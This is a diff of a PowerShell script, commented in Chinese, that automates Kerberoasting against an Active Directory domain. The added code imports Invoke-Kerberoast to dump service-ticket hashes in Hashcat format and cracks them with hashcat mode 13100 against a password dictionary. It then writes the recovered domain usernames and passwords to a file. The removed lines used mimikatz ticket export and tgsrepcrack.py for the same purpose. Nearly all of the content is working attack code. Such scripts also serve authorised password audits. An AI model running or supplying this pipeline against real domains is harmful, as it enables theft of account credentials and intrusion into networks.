@@ -112,41 +112,42 @@ function Del-SPN{
 	Write-Host "全部删除成功"
 }
 
-# 访问SPN得到TGS发放的服务票据ST
+# 访问SPN得到TGS发放的服务票据ST,提取其中的Hash值并保存到krbstHash.txt文件中去
 function Get-ServiceTicket{
 	Param(
-		[System.Collections.ArrayList] $sucSPNListB
+		[String] $krbstHashFileName
 	)
-	# 引入系统模型
-	Add-Type -AssemblyName System.IdentityModel
-	foreach ($spnStr in $sucSPNListB){
-		# 进行Kerberos的第三步
-		New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList  $spnStr	
-	}
+	Import-Module ./kerberoast/Invoke-Kerberoast.ps1
+	# Set-Content 以ANSI编码方式保存文件；Out-File 默认以Unicode方式保存文件，因而需要指定编码格式
+	Invoke-Kerberoast -OutputFormat Hashcat|select hash|%{$_.Hash}|Out-File $krbstHashFileName -Encoding ascii
 }
 # 引入tgscrack来爆破下载下来的凭据
 function Crack-ServiceTicket{
+	Param(
+		[String] $krbstHashFileName,
+		[String] $passwdDictFileName
+	)
 	Write-Host "正在爆破中ing.......请稍等"
 	# $tgsCrackResult = python27 .\kerberoast\tgsrepcrack.py .\Dicts\GaiaPasswd.txt .\*.kirbi
-	python27 .\kerberoast\tgsrepcrack.py .\Dicts\GaiaPasswd.txt .\*.kirbi | Tee-Object -Variable tgsCrackResult
-	$passwdAndSPN = $tgsCrackResult | %{ if ($_.contains("found")){ $_}}|%{$_.split(" ")[5] + "#" +$_.split(" ")[-1].split("~")[0].split("@")[-1] + "/" + $_.split(" ")[-1].split("~")[-1].substring(0,($_.split(" ")[-1].split("~")[-1].lastindexof("-")))}
-	# 
-	if((Test-Path '.\result\sucSPNList.txt') -and (Test-Path ".\result\sucUserList.txt")){
-		Write-Host "启用文件sucSPNList.txt和sucUserList.txt中的内容"
-		$sucSPNList = Get-Content .\result\sucSPNList.txt  
-		$sucUserList = Get-Content .\result\sucUserList.txt
+	if((Test-Path $krbstHashFileName) -and (Test-Path $passwdDictFileName)){
+		.\hashcat\hashcat64.exe -m 13100 -a 0 $krbstHashFileName $passwdDictFileName -o ".\succeed.txt" --force
+		if(Test-Path ".\result\succeed.txt"){
+			$hashAndPasswdList = Get-Content ".\result\succeed.txt"
+			$userAndPasswdList = New-Object System.Collections.ArrayList
+			foreach($item in $hashAndPasswdList){
+				$userStr = ($item.split("$")[3]).split("*")[1]
+				$passwdStr = $item.split(":")[1]
+				$userAndPasswd = $userStr + "|#|" + $passwdStr
+				Write-Host -ForegroundColor Green "【+】" $userAndPasswd
+				$userAndPasswdList.add($userAndPasswd) | Out-Null
+			}
+		}else{
+			Write-Host "没有从密码字典中审计出弱口令"
+			return $false
+		}
 	}else{
 		Write-Host "相关文件不存在，EXIT"
 		return $false
-	}
-	$userAndPasswdList = New-Object System.Collections.ArrayList
-	foreach ($item in $passwdAndSPN){
-		$spnStr = $item.split("#")[-1]
-		$passwdStr = $item.split("#")[0]
-		$userStr = $sucUserList[$sucSPNList.indexof($spnStr)]
-		$userAndPasswd = $userStr + "|#|" + $passwdStr
-		Write-Host -ForegroundColor Green "【+】" $userAndPasswd
-		$userAndPasswdList.add($userAndPasswd) | Out-Null
 	}
 	Write-Host "将破解出的用户名和密码保存到userAndPasswdList.txt文件中去"
 	$userAndPasswdList | Out-File ".\result\userAndPasswdList.txt"
@@ -175,15 +176,15 @@ if(-Not (Test-Path ".\result")){
 # 2. 注册SPN
 # Read-Host "为每一个域用户账号注册SPN`n按任意键将继续执行" | Out-Null
 # $sucUserList,$sucSPNList,$faiUserList = Set-SPN $allUserList
-# 3. 访问SPN获得ST
-# Get-ServiceTicket $sucSPNList
+# 3. 访问SPN获得ST,并以hashcat模式保存到文件krbstHash.txt中
+$krbstHashFile = ".\krbstHash.txt"
+#Get-ServiceTicket $krbstHashFile
 # 4. 删除SPN
 # Read-Host "下面将要为注册SPN成功的域用户账户删除SPN`n按任意键将继续执行"|Out-Null
 # Del-SPN $sucSPNList $sucUserList
-# 5. 导出系统中缓存的ST
-# .\mimikatz\x64\mimikatz.exe "kerberos::list /export" exit
-# 6. 爆破ST中含有的SPN的口令
-Crack-ServiceTicket
+# 6. 使用hashcat爆破ST中hash对应的口令
+$passwdDictFile = ".\Dicts\JCPasswd.txt"
+Crack-ServiceTicket $krbstHashFile $passwdDictFile
 # 7. 删除第5步中保存的.kirbi文件
 # Del-ServiceTicket
 Write-Host "ALL OVER"
